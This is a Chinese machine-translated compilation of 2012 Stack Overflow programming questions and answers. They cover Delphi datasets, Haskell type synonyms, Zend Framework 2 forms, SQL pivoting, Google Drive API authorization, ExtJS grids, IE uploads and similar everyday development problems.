例如，数据返回如下：

```
[dbxds == TSQLDataSet
 cds == TClientDataSet]

dbxds.commandtext='select s.sfield1, s.sfield2, t.tfield1, t.tfield2 from s left join t on s.sfield1 = t.tfield1';

cds.Open;

cds.fieldByName(sfield2).visible:=false;//to hide from a dbgrid
cds.fieldByName(tfield2).visible:=false;//to hide from a dbgrid 
```

从 XE2 调用时，没有问题。当从 Delphi 7 调用时，最后一行（用于从 db 网格中隐藏该字段）给出了一个错误：

```
cds: Field 'tfield2' not found 
```

虽然第一行很好 - 如果我切换查询的顺序以便首先检索“t”字段（“from t left join s”），那么我会在“s”字段上得到错误。

关于可能导致不兼容的任何想法？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:32:17.897

好吧，我注意到了一些奇怪的事情，这让我走上了寻找答案的道路。

碰巧的是，在任一表中，我试图访问以隐藏的字段都是“tinyint(1)”类型。如果我试图隐藏 int/varchar 等类型的字段，则不会引发错误。

我将我的 'tinyint(1)' 字段换成 'int(1)' 并且它工作正常。

不知道为什么会发生这种情况，但我很高兴我抓住了它，如果其他人遇到这个问题，我希望这也能回答他们的问题。

# haskell - 参数化类型作为类型参数

> ID：12460837
> 
> 赞同：2
> 
> 时间：2012-09-17T13:56:57.433
> 
> 标签：haskell

编译时：

```
data Rec t = Rec { intPt :: t Int, doublePt :: t Double } deriving Show

type Pt2 a = (a,a)
type Pt3 a = (a,a,a)

type Rec2 = Rec Pt2 
type Rec3 = Rec Pt3

main = do
      print $ Rec (1,2) (3.4,5.6)
      print $ Rec (1,2,3) (5.6, 7.8, 9.0) 
```

我有

```
Unexpected type `t a' where type variable expected
In the declaration of `Rec (t a)' 
```

如何使这个编译和工作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:41:07.610

我无法重现您报告的确切错误消息，但我可以看到您的示例存在两个问题。

1.  您正在尝试通过类型构造函数对其进行参数化`Show`。`Rec`目前这对于 GHC 来说很难完全自动完成，但是您可以通过启用一些扩展来使其在实践中工作。

2.  您正在使用部分应用的类型同义词`Pt2`并`Pt3`作为 的参数`Rec`，这是不允许的。您可以通过切换到数据类型来解决此问题。

更详细一点：要解决问题 1，您可以说：

```
{-# LANGUAGE StandaloneDeriving, FlexibleContexts, UndecidableInstances #-}

data Rec t = Rec { intPt :: t Int, doublePt :: t Double }
deriving instance (Show (t Int), Show (t Double)) => Show (Rec t) 
```

通过使用独立的派生子句，您可以明确指定`Show`实例的先决条件。在这种情况下，这些前提条件还需要启用`FlexibleContexts`和`UndecidableInstances`扩展。

要解决问题 2，您可以执行以下操作：

```
data Pt2 a = Pt2 a a deriving Show
data Pt3 a = Pt3 a a a deriving Show

type Rec2 = Rec Pt2 
type Rec3 = Rec Pt3 
```

可以部分应用数据类型，但不能应用类型同义词。因此，仅当是数据类型时才允许将`Pt2`其用作参数。通过这些修改，您的主要功能类型检查（和工作）：`Rec``Pt2`

```
main = do
  print $ Rec (Pt2 1 2) (Pt2 3.4 5.6)
  print $ Rec (Pt3 1 2 3) (Pt3 5.6 7.8 9.0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:37:52.220

我不确定您使用的是什么 GHC，但此代码中的错误是：

```
A.hs:6:1:
    Type synonym `Pt2' should have 1 argument, but has been given none
    In the type synonym declaration for `Rec2' 
```

因为可能不会部分应用类型同义词，这对于 Rec2 的更高种类参数至关重要。

考虑使用例如类型族或显式数据而不是类型同义词。

# php - 在 Zend Framework 2 中创建一个下拉列表

> ID：12460840
> 
> 赞同：5
> 
> 时间：2012-09-17T13:57:11.463
> 
> 标签：php, drop-down-menu, zend-framework2

我知道这听起来更基本，但我仍然想发布我的问题，因为它与 Zend Framework 2 相关。我从 Zend 示例模块中知道这种形式

```
namespace Album\Form;

use Zend\Form\Form;

class AlbumForm extends Form
{
    public function __construct($name = null)
    {
        // we want to ignore the name passed
        parent::__construct('album');
        $this->setAttribute('method', 'post');
        $this->add(array(
            'name' => 'id',
            'attributes' => array(
                'type'  => 'hidden',
            ),
        ));
        $this->add(array(
            'name' => 'artist',
            'attributes' => array(
                'type'  => 'text',
            ),
            'options' => array(
                'label' => 'Artist',
            ),
        ));
        $this->add(array(
            'name' => 'title',
            'attributes' => array(
                'type'  => 'text',
            ),
            'options' => array(
                'label' => 'Title',
            ),
        ));
        $this->add(array(
            'name' => 'submit',
            'attributes' => array(
                'type'  => 'submit',
                'value' => 'Go',
                'id' => 'submitbutton',
            ),
        ));
    }
} 
```

这就是以这种方式调用的

```
<?php
$form = $this->form;
$form->setAttribute('action', $this->url('album', array('action' => 'add')));
$form->prepare();

echo $this->form()->openTag($form);
echo $this->formHidden($form->get('id'));
echo $this->formRow($form->get('title'));
echo $this->formRow($form->get('artist'));
echo $this->formSubmit($form->get('submit'));
echo $this->form()->closeTag(); 
```

如何为艺术家字段添加一个下拉列表，该列表存储在关联数组中。自从我进入 Zend Framework 2 以来，我希望得到专家的建议。我已经关注[了上一篇文章](https://stackoverflow.com/questions/12301421/zf2-create-select-drop-down-box-and-populate-options-in-controller?rq=1)，但对我来说有点不清楚。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-17T14:56:39.247

这是对静态选项执行此操作的一种方法。

```
....

$this->add(array(
    'type' => 'Zend\Form\Element\Select',
    'name' => 'number'
    'options' array(
        'options' => array( '1' => 'one', '2', 'two' )
    )
)); 
```

**被警告....**

因为您是在构造函数中创建表单，所以您将无法访问 ServiceManger。如果您想从数据库中填充，这可能会导致问题。

让我们尝试类似...

```
class AlbumForm extends Form implements ServiceManagerAwareInterface
{

public function __construct()
{
    ....

    $this->add(array(
        'type' => 'Zend\Form\Element\Select',
        'name' => 'number'
    ));

    ....
} 
```

……

```
public function initFormOptions()
{
    $this->get('number')->setAttribute('options', $this->getNumberOptions());
}

protected function getNumberOptions()
{
    // or however you want to load the data in
    $mapper = $this->getServiceManager()->get('NumberMapper');
    return $mapper->getList();
}

public function getServiceManager()
{
    if ( is_null($this->serviceManager) ) {
        throw new Exception('The ServiceManager has not been set.');
    }

    return $this->serviceManager;
}

public function setServiceManager(ServiceManager $serviceManager)
{
    $this->serviceManager = $serviceManager;
} 
```

**但这不是很好，请重新考虑...**

扩展表单以便您可以创建表单是不太正确的。我们不是在创建一种新的表单，我们只是在设置一个表单。这需要一个工厂。此外，在这里使用工厂的好处是我们可以设置它，以便我们可以使用服务管理器为其提供服务，这样服务管理器可以注入自己而不是我们从控制器手动执行。另一个优点是，只要我们有服务管理器，我们就可以调用这个表单。

值得一提的另一点是，在有意义的地方，我认为最好将代码从控制器中取出。控制器不是脚本转储，所以让对象自己照顾是件好事。我想说的是，向一个对象注入它需要的对象是很好的，但是仅仅将来自控制器的数据交给它是不行的，因为它会产生太多的依赖关系。**不要用勺子喂食控制器中的物体，请注入勺子。**

无论如何，太多的咆哮更多的代码......

```
class MySpankingFormService implements FactoryInterface
{
    public function createService(ServiceLocatorInterface $serviceManager )
    {
        $mySpankingNewForm = new Form;

        // build that form baby,
        // you have a service manager,
        // inject it if you need to,
        // otherwise just use it.

        return $mySpankingNewForm;
    }
} 
```

控制器

```
<?php

class FooController
{
    ...
    protected function getForm()
    {
        if ( is_null($this->form) ) {
            $this->form =
                $this->getServiceManager()->get('MySpankingFormService');
        }
        return $this->form;
    }
    ...
} 
```

模块.config.php

```
...
'service_manager' => array (
        'factories' => array (
            ...
            'MySpankingFormService'
                => 'MyNameSpacing\Foo\MySpankingFormService',
            ... 
```

# asp.net - sql查询从单行中的两个表中获取数据

> ID：12460842
> 
> 赞同：0
> 
> 时间：2012-09-17T13:57:16.733
> 
> 标签：asp.net, sql-server

```
(Order Table)
ID  Order_Type  Order_Name  
70  1       1   

(Details Table)
ID  Day    Start_Time   End_Time
70  Monday     17:05:00 18:05:00
70  Tuesday    17:10:00 18:10:00
70  Wednesday  17:15:00 18:15:00
70  Thursday   17:20:00 18:20:00
70  Friday     17:25:00 18:25:00
70  Saturday   17:30:00 18:30:00

 ID  Order_Type Monday_Start_Time  Monday_End_Time  Tuesday_Start_Time  Tuesday_End_Time   
    70  1          17:05:00           18:05:00          17:10:00            18:10:00 
```

我必须在周日开始时间结束时间之前显示上述数据。我的查询应该如何

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:07:47.347

您可以为此使用 an`UNPIVOT`和 a `PIVOT`：

```
select *
from
(
  select id, order_type, order_name,
    day + '_' + col as col,
    val
  from 
  (
    select o.id,
      o.order_type,
      o.order_name,
      d.day,
      d.start_time,
      d.end_time
    from orders o
    inner join details d
      on o.id = d.id
  ) x
  unpivot
  (
    val
    for col in (start_time, end_time)
  ) u
) x1
pivot
(
  min(val)
  for col in ([Monday_start_time], [Monday_end_time], 
              [Tuesday_start_time], [Tuesday_end_time],
              [Wednesday_start_time], [Wednesday_end_time],
              [Thursday_start_time], [Thursday_end_time],
              [Friday_start_time], [Friday_end_time],
              [Saturday_start_time], [Saturday_end_time])
) p 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/7e878/7)

如果您不想使用`UNPIVOT`and`PIVOT`或正在使用没有这些功能的版本，那么您需要执行多个连接：

```
select o.id,
   o.order_type,
   o.order_name,
   mon.start_time Monday_Start_time,
   mon.end_time Monday_End_time,
   tues.start_time Tuesday_Start_time,
   tues.end_time Tuesday_End_time,
   wed.start_time Wednesday_Start_time,
   wed.end_time Wednesday_End_time,
   thur.start_time Thursday_Start_time,
   thur.end_time Thursday_End_time,
   fri.start_time Friday_Start_time,
   fri.end_time Friday_End_time,
   sat.start_time Saturday_Start_time,
   sat.end_time Saturday_End_time
from orders o
left join details mon
  on o.id = mon.id
  and mon.day = 'Monday'
left join details tues
  on o.id = tues.id
  and tues.day = 'tuesday'
left join details wed
  on o.id = wed.id
  and wed.day = 'wednesday'
left join details thur
  on o.id = thur.id
  and thur.day = 'thursday'
left join details fri
  on o.id = fri.id
  and fri.day = 'friday'
left join details sat
  on o.id = sat.id
  and sat.day = 'saturday' 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/7e878/15)

# google-drive-api - Google Drive DriveCommandLine 示例应用程序不起作用？

> ID：12460847
> 
> 赞同：0
> 
> 时间：2012-09-17T13:57:24.517
> 
> 标签：google-drive-api

目前已知 Google Drive API 示例命令行应用程序 (DriveCommandLine) 可以工作吗？我已经下载了 Java 客户端库，并编译了示例应用程序（插入我的应用程序的客户端 ID 和通过指定“已安装应用程序”和“其他”创建的密码）。它运行并通知我在浏览器中访问以下链接：

[https://accounts.google.com/o/oauth2/auth?access_type=online&approval_prompt=auto&client_id=MY_ACTUAL_CLIENT_ID&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=https://www.googleapis.com/auth/驾驶](https://accounts.google.com/o/oauth2/auth?access_type=online&approval_prompt=auto&client_id=MY_ACTUAL_CLIENT_ID&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=https://www.googleapis.com/auth/drive)

（显然那里有我的实​​际客户 ID。）

这成功地为我提供了身份验证代码。当我在应用程序的提示符下输入它时，然后在该行：

```
File file = service.files().insert(body, mediaContent).execute(); 
```

我得到了例外：

```
Exception in thread "main" com.google.api.client.http.HttpResponseException: 401 Unauthorized
    at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:978)
    at com.google.api.client.googleapis.media.MediaHttpUploader.executeUploadInitiation(MediaHttpUploader.java:338)
    at com.google.api.client.googleapis.media.MediaHttpUploader.upload(MediaHttpUploader.java:252)
    at com.google.api.services.drive.Drive$Files$Insert.executeUnparsed(Drive.java:309)
    at com.google.api.services.drive.Drive$Files$Insert.execute(Drive.java:331)
    at DriveCommandLine.main(DriveCommandLine.java:56) 
```

调查显示`GoogleCredential`返回的所有元素都设置为 null（这似乎是错误的）。

我使用的 Drive API 客户端版本是“v2-rev5-1.7.2-beta”，这是当前快速入门页面上指向的版本： [https ://developers.google.com/drive/quickstart](https://developers.google.com/drive/quickstart)

我正在使用这个 JAR 以及类路径中“libs”子目录中的所有 JAR 进行编译和运行（快速入门页面是指将源 JAR 添加到类路径，这显然不起作用）。

谁能阐明这里可能出了什么问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T21:21:33.810

快速入门中的链接已过时。尝试从以下链接下载 Drive SDK：[http ://code.google.com/p/google-api-java-client/wiki/APIs#Drive_API](http://code.google.com/p/google-api-java-client/wiki/APIs#Drive_API)

看看这对你有没有影响。我的 DriveCommandLine 应用程序运行良好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-30T05:44:43.607

*   您需要从 [https://cloud.google.com/console](https://cloud.google.com/console)的 API 访问页面下载 JSON 文件。

*   将此 json 文件重命名为“client_secrets.json”

*   将此 json 复制到您的项目文件夹中，或者更具体地说，将其复制到“src/main/resources”中。（此文件包含 clientID 和机密）。如果该文件已存在于文件夹中，则将其替换。

*   现在运行项目。您将被重定向到 Google Drive 的“允许访问”页面。

PS - json 文件必须属于“已安装类型的应用程序”，因为这是一个命令行示例并在本地运行。

# python - 在 Python 模块中查找其他函数

> ID：12460857
> 
> 赞同：0
> 
> 时间：2012-09-17T13:58:03.050
> 
> 标签：python

我正在开发一个函数，该函数会自动获取我编写的一些代码并在 python 中创建校验和，以便与源代码一起上传。

问题是我需要在我当前所在的同一模块中动态发现其他功能。

这样我们就可以继续编写更多代码并自动更新它。

TL：博士；为同一源文件中的函数制作自动源代码校验和和上传工具。如何找到所有其他功能？

例如：

```
def func1(y):
    some random stuff.....
    return x

def autochecksum():
    for func in module:
        checksum = md5(inspect.code(func)).hexdigest
        othermodule.upload(inspect.code(func), checksum) 
```

我能得到的最接近的是（纯侥幸所有函数名称都以 get_ 开头）：

```
def update_jms_directory():
    import appdata.transfer.uploads as uploads
    for function in dir(uploads):
        if function.startswith("get_"):
            package_function() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:00:41.070

查看 dir 函数，[http://docs.python.org/tutorial/modules.html#the-dir-function](http://docs.python.org/tutorial/modules.html#the-dir-function)

这使您能够查看模块定义的所有名称的排序列表，这应该是一个很好的起点。

# ruby-on-rails - Rails 模型“LoadError：Expected”和名称使用中的下划线 (_)

> ID：12460860
> 
> 赞同：1
> 
> 时间：2012-09-17T13:58:12.033
> 
> 标签：ruby-on-rails, model, naming-conventions

尝试通过 rails 控制台定位模型

```
>> f = DBFile.find_by_id(1)
>> NameError: uninitialized constant DBFile
>> D_B_File.all()
LoadError: Expected /home/thrive/rails_projects/tester/app/models/d_b_file.rb to define D_B_File
>> f = DBFile.find_by_id(1)
#<DBFile id: 1, file_name: "output-May-2010.csv"> 
```

现在当我重命名模型 d_b_file.rb >> db_file.rb

```
>> f = DBFile.find_by_id(1)
#<DBFile id: 1, file_name: "output-May-2010.csv"> 
```

那么原始模型名称中的附加下划线......阻止它正常加载呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:35:20.733

问题是文件名与类名直接相关，因为 Rails 依赖于它来确定它应该在哪里查找类。

所以，`"DBFile".underscore`会给你`db_file`。这就是 Rails 期望找到该类的地方。

# javascript - javascript 的卸载和 beforeunload 替代方案

> ID：12460861
> 
> 赞同：4
> 
> 时间：2012-09-17T13:58:14.843
> 
> 标签：javascript, jquery, onbeforeunload

我需要监视用户何时离开页面（移至不同站点而不是同一站点）或关闭窗口/选项卡。我可以通过`$(window).bind('unload', function() {});`但`onload`它是一个包罗万象的事件来实现这一点：它还捕获页面刷新并导航到同一网站上的不同页面。请问如何使用 javascript/jQuery 检测这两个事件（页面刷新和导航到同一网站中的另一个页面）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:15:56.187

我认为这是不可能的，我不知道这样的事件。

一种可能的解决方案是将当前 url 与目标 url 进行比较，但由于安全和隐私原因，这是不可能的，请参阅：

[如何在 javascript onbeforeunload 事件中获取目标网址？](https://stackoverflow.com/questions/1686687/how-can-i-get-the-destination-url-in-javascript-onbeforeunload-event)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-20T16:12:03.617

在每一页上，

```
var leaving = true;

$(function() {
    $('a[rel!=ext]').click(function () { leaving = false; });
    $('form').submit(function () { leaving = false; });
});

$(function() { window.onbeforeunload = unloadPage; });

function unloadPage() {
    if(leaving) {
        // Put your logic here
    }
} 
```

然后只需确保所有指向外部站点的链接都具有`rel="ext"`属性。

# c# - C# Windows 窗体如何 Datagridview 到数据库（Sql Server）？

> ID：12460864
> 
> 赞同：0
> 
> 时间：2012-09-17T13:58:17.807
> 
> 标签：c#, sql, sql-server, sql-server-2008, c#-4.0

我需要将 Datagridview 中的数据插入 Sql Server 2008 中的数据库。但不工作。

“.Rows(i)”消息错误：

> '不可调用的成员'System.Windows.Forms.DataGridView.Rows'不能像方法一样使用。'

**代码 C#（Windows 窗体）**

```
SqlConnection Conn = new SqlConnection();
SqlCommand cmd = new SqlCommand();
StringBuilder sb = new StringBuilder();
SqlTransaction tr;

private void testExcel_Load(object sender, EventArgs e)
{
    string appConn = ConfigurationManager.ConnectionStrings["connDB"].ConnectionString;
    Conn = new SqlConnection();
    if (Conn.State == ConnectionState.Open)
    {
        Conn.Close();

    }
    Conn.ConnectionString = appConn;
    Conn.Open();
}

private void button2_Click(object sender, EventArgs e)
{
    tr = Conn.BeginTransaction();

    sb.Remove(0, sb.Length);
    sb.Append("INSERT INTO tableAset (Id,AsId,AsRefid,Invid,TypeName)");
    sb.Append("VALUES (@Id,@AsId,@AsRefid,@Invid,@TypeName)");
    string sqlSave = sb.ToString();

    for (int i = 0; i < dataGridView1.Rows.Count - 1; i++)
    {     
      cmd.CommandText = sqlSave;
      cmd.CommandType = CommandType.Text;
      cmd.Connection = Conn;
      cmd.Transaction = tr;
      cmd.Parameters.Clear();

      cmd.Parameters.Add("@Id", SqlDbType.Int).Value = dataGridView1.Rows(i).Cells(0).Value;
      cmd.Parameters.Add("@AsId", SqlDbType.VarChar).Value = dataGridView1.Rows(i).Cells(1).Value;
      cmd.Parameters.Add("@AsRefid", SqlDbType.VarChar).Value = dataGridView1.Rows(i).Cells(2).Value;
      cmd.Parameters.Add("@Invid", SqlDbType.VarChar).Value = dataGridView1.Rows(i).Cells(3).Value;
      cmd.Parameters.Add("@TypeName", SqlDbType.VarChar).Value = dataGridView1.Rows(i).Cells(4).Value;

      cmd.ExecuteNonQuery();
      tr.Commit();
      MessageBox.Show("It's Done!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
} 
```

非常感谢您的宝贵时间。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:00:07.343

您应该使用**rows[i]**代替，单元格也是如此：

```
dataGridView1.Rows[i].Cells[0].Value 
```

查看[Rows 属性](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridview.rows.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:00:25.673

只需用方括号替换圆括号

```
dataGridView1.Rows[i].Cells[0].Value; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-09-09T02:03:57.243

我推荐使用 SqlBulkCopy。您可以轻松获取 DataTable 格式的 GridView 数据，您可以将 DataTable 传递给 SqlBulkCopy WriteToServer 您可以查看此示例。 [https://www.aspsnippets.com/Articles/Using-SqlBulkCopy-to-insert-bulk-data-from-GridView-to-database-in-ASPNet.aspx](https://www.aspsnippets.com/Articles/Using-SqlBulkCopy-to-insert-bulk-data-from-GridView-to-database-in-ASPNet.aspx)

# css - 使用 Courier 字体的旋转文本未在 Opera 中显示

> ID：12460870
> 
> 赞同：6
> 
> 时间：2012-09-17T13:58:35.627
> 
> 标签：css, fonts, opera, css-transforms

我有以下 HTML：

```
<div class='box'>text</div>​ 
```

和 CSS：

```
.box {
    /* non-essential */
    display: inline-block;
    margin: 2em;
    background: plum;

    /* ESSENTIAL */
    transform: rotate(45deg);
    font-family: Courier;
}​ 
```

这就是[**小提琴**](http://jsfiddle.net/thebabydino/MabJd/)。我在这里省略了前缀，但它们在小提琴中。

预期结果：

![预期结果](../Images/a39c71f49115f8932c53d38c258fc623.png)

这也是我在 Chrome、Firefox、IE9、Safari 中得到的结果。

然而，在 Opera 中它看起来像这样：

![歌剧结果](../Images/fb89274b20bbf735a7854ee28f0551a5.png)

*   如果我取出变换（即 div 不再旋转），则显示文本。
*   如果我用另一种字体替换字体，则会显示文本。

那么**为什么会发生这种情况**以及**我还有哪些其他解决方案**？

如果这有帮助：

![关于歌剧](../Images/47e236d65580cee1c2f91043083a6f93.png)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-27T10:58:32.520

### 为什么会这样

*发生这种情况是因为 Opera 已将Courier*解析为`courier.fon`位图字体，而 Opera 尚未实现位图字体的旋转。

*使用Modern*和*Roman*以及您拥有`.fon`版本的任何其他字体，您都会得到相同的结果。

您可以查看`C:\Windows\Fonts`完整列表。

### 我还有什么其他解决方案

如果您在页面上显示字体时依赖于字体的确切指标，您可能需要考虑使用网络字体。

如果调用字体“courier”很重要，那么你可以忽略 opera：它不是很流行，这是一个有点晦涩的错误，而且由于[Opera 正在放弃 Presto 而使用 Webkit](http://my.opera.com/ODIN/blog/300-million-users-and-move-to-webkit)，它只涉及等待。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-17T14:12:15.283

如果您将 font-family 标记更改为以下内容，则可以：

```
font-family:"Courier New", Courier, monospace; 
```

[http://jsfiddle.net/3tTyp/1/](http://jsfiddle.net/3tTyp/1/)

# image - 从点中提取图像上的单词或短语区域以进一步识别的最佳方法？

> ID：12460875
> 
> 赞同：1
> 
> 时间：2012-09-17T13:58:45.123
> 
> 标签：image, image-processing, word, ocr, crop

解决方案必须是通用的（使用不同的字体和颜色）并且稳定。

输入数据是带有 X、Y 坐标的点，输出数据是矩形或更复杂的形状，其中包含单词或短语。

![带有输入点（红色）和输出矩形（蓝色）的图像](../Images/687dea720d64d3473cec8b0638594b7e.png)

现在我使用[**hocr**](https://stackoverflow.com/questions/8962160/text-blocks-positions-and-sizes-detection-in-command-line-mode-in-tesseract)选项对整个图像进行 tesseract 识别，然后从输出 html 中提取所有矩形，最后找到最接近点的 reactangle。代码如下所示。但它效率低下，因为整个图像识别。

当然，可以识别不是整个图像，而是部分图像，但这也不是一个明确的解决方案，因为不同的字体大小和无用的单词识别都是一样的。

**更新**

```
public class WordRecognizerTesseractHocr
{
    const string HelperFileName = "temp";

    public string NextVariant()
    {
        Bitmap.Save(HelperFileName + ".png", ImageFormat.Png);
        var startInfo = new ProcessStartInfo("tesseract.exe", HelperFileName + ".png temp hocr");
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        var process = Process.Start(startInfo);
        process.WaitForExit();

        var result = GetNearestWord(File.ReadAllText(HelperFileName + ".html"), Position);

        return result;
    }

    public string GetNearestWord(string tesseractHtml, Point position)
    {
        var xml = XDocument.Parse(tesseractHtml);

        RectsWords = new Dictionary<Rectangle, string>();

        var ocr_words = xml.Descendants("span").Where(element => element.Attribute("class").Value == "ocr_word").ToList();
        foreach (var ocr_word in ocr_words)
        {
            var strs = ocr_word.Attribute("title").Value.Split(' ');
            int left = int.Parse(strs[1]);
            int top = int.Parse(strs[2]);
            int width = int.Parse(strs[3]) - left + 1;
            int height = int.Parse(strs[4]) - top + 1;
            RectsWords.Add(new Rectangle(left, top, width, height), ocr_word.Value);
        }

        var nearestWords = RectsWords.OrderBy(rectWord => Distance(position, rectWord.Key));

        return nearestWords.Count() != 0 ? nearestWords.First().Value : string.Empty;
    }

    public static double Distance(Point pos, Rectangle rect)
    {
        if (pos.X < rect.Left)
        {
            if (pos.Y < rect.Top)
                return Math.Sqrt((rect.X - pos.X) * (rect.X - pos.X) + (rect.Top - pos.Y) * (rect.Top - pos.Y));
            else if (pos.Y < rect.Top + rect.Height)
                return rect.Left - pos.X;
            else
                return Math.Sqrt((rect.X - pos.X) * (rect.X - pos.X) + 
                    (rect.Top + rect.Height - 1 - pos.Y) * (rect.Top + rect.Height - 1 - pos.Y));
        }
        else if (pos.X < rect.Left + rect.Width)
        {
            if (pos.Y < rect.Top)
                return rect.Top - pos.Y;
            else if (pos.Y < rect.Top + rect.Height)
                return 0;
            else
                return pos.Y - (rect.Top + rect.Height - 1);
        }
        else
        {
            if (pos.Y < rect.Top)
                return Math.Sqrt((rect.X + rect.Width - 1 - pos.X) * (rect.X + rect.Width - 1 - pos.X) + 
                    (rect.Top - pos.Y) * (rect.Top - pos.Y));
            else if (pos.Y < rect.Top + rect.Height)
                return pos.X - (rect.Left + rect.Width - 1);
            else
                return Math.Sqrt((rect.X + rect.Width - 1 - pos.X) * (rect.X + rect.Width - 1 - pos.X) +
                    (rect.Top + rect.Height - 1 - pos.Y) * (rect.Top + rect.Height - 1 - pos.Y));
        }
    }

    public IDictionary<Rectangle, string> RectsWords
    {
        get;
        protected set;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:36:41.983

这是可能有用的东西。它应该很快，但很容易被噪音伤害。

首先获取文本的歪斜图像，以您最容易使用的任何格式。

接下来，在 x,y 中获取您关心的点。

从 y 坐标开始，上下查看完整的行，直到看到几个完全空的行。这些将为您指定的点标记文本行的顶部和底部。这些是 y 中矩形一词的边界。

对 x 重复相同的操作，但查找列以获取 x 中单词矩形的边界。

现在你应该有整个词的界限，你可以很容易地从中得到这个词。

# javascript - 将可折叠图像隐藏到一个网格中

> ID：12460878
> 
> 赞同：0
> 
> 时间：2012-09-17T13:58:54.500
> 
> 标签：javascript, extjs

正如标题所说，我需要从一个网格中隐藏可折叠图像（我在同一个网络中有很多），我不能简单地更改 CSS，因为我的网络中的每个网格都会做同样的事情，我只想要那个网格没有背景图片。

我试图创建一个 css 类`background-image: none`并更改 bodyCssClass、baseCls、cls 配置，但我没有获得预期的行为。

任何想法？

编辑1：

**网格面板代码：**

```
var grid = new Ext.grid.GridPanel({
    id: "gridPanel1",
    disableSelection: true,
    frame: true,
    title: "Centers",
    //autoHeight: true,
    height: 415,
    width: 500,
    store: store,
    colModel: new Ext.grid.ColumnModel(items),
    ctCls: 'noCollapsable',
    view: groupingVi,
    sm: selectionMod
}); 
```

**CSS：**

```
.noCollapsable{
    background-image: none !important;
} 
```

编辑2：

是的！这和那个例子完全一样（[http://dev.sencha.com/deploy/ext-4.1.0-gpl/examples/grid/groupgrid.html](http://dev.sencha.com/deploy/ext-4.1.0-gpl/examples/grid/groupgrid.html)），但是背景图片在

```
 <div class="x-grid-group-title">Cuisine: CountryX (Y Items)</div> 
```

而且我不知道如何使用 Ext DomHelper 或任何东西来改变这个结构内的那些 div 的 css：

```
<tr id="gridview-1013-hd-CountryX" class="x-grid-group-hd x-grid-group-hd-collapsed">
   <td class="x-grid-cell" colspan="2" style="padding-left:0px;">
      <div class="x-grid-cell-inner">
         <div class="x-grid-group-title">Cuisine: Country X (Y Items)</div>
      </div>
   </td>
</tr> 
```

我可以使用第一个 tr 的 id 与其他网格区分开来，但正如我所说，我不知道如何访问这些 div

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:50:00.433

你可以发布一些代码，因为会有更好的方法来实现这一点。但作为一个猜测。

当您将以下内容分配给网格时会发生什么

```
baseCls: 'myClass'; 
```

然后在你的CSS中。

```
.myClass{background-image: none !important;} 
```

# php - 在 IE 9 / 10 中上传文件失败

> ID：12460880
> 
> 赞同：1
> 
> 时间：2012-09-17T13:59:03.837
> 
> 标签：php, internet-explorer, file-upload, internet-explorer-8, internet-explorer-9

我有以下问题：

在我正在为客户端编码的网站上，我有一个表单，您可以在其中上传图像（最多 5 个，单独的文件输入元素（因此没有由 flash / javascript 解决方案引起的问题））。但有时上传直接失败（几乎立即显示“页面无法显示”页面）或请求不包含文件。

这不是文件大小的问题（有时会发生这种情况，无论文件是更大（~2-3MB）还是非常小（150kB））或请求超时（因为上传直接失败，但并不总是）经常 ;-））。

另一个奇怪的事情：我试图用 Fiddler 分析整个事情。但是在使用 Fiddler 时，这个问题根本不会发生。

有任何想法吗？

在 Win7/8
Chrome、FF 等的 IE9/10 中测试，当然可以正常工作 ;-)

/edit：我使用了一个非常简单的测试脚本（像常规 webapp 一样失败）

```
<?='<!DOCTYPE html>'?>
<html>
<head>
    <title>Upload Test</title>
</head>
<body>
    <form action="http://www.site.com/upl-test/index.php" method="post"     enctype="multipart/form-data">
        <input type="file" name="img_file0" />
        <input type="file" name="img_file1" />
        <input type="file" name="img_file2" />
        <input type="file" name="img_file3" />
        <input type="file" name="img_file4" />
        <input type="submit" name="submit_btn" value="Upload" />
    </form>
    <?php 
    if(!empty($_FILES)){
        echo '<hr /><pre>';
        var_dump($_FILES);
        echo '</pre>';
    }
    ?>
</body>
</html> 
```

# playframework-2.0 - 在 sbt 的 project/Build.scala 中设置 PlayProject 的基本目录

> ID：12460888
> 
> 赞同：3
> 
> 时间：2012-09-17T13:59:22.367
> 
> 标签：playframework-2.0

是否可以更改游戏项目的基本目录？

```
val web = PlayProject("web",).dependsOn(common) 
```

就像我可以在标准 sbt 项目中更改它一样

```
val common = Project(id = "common", base = file("common"))

val akka_service = Project(id = "service", base = file("service")).dependsOn(common) 
```

我想要完成的事情是这样的目录结构

```
MyApp
     myWebApp
         app
             controllers
             views            
         conf
         public
     common
         src
             scala
     service
         src
             scala
     project
         Build.scala 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T18:35:33.000

据我所知（[并在此处描述](https://stackoverflow.com/questions/11794500/play-2-0-framework-multi-module-project)），子模块必须是包含应用程序文件夹的子文件夹，但您的版本控制系统应该允许您在项目中包含共享存储库。

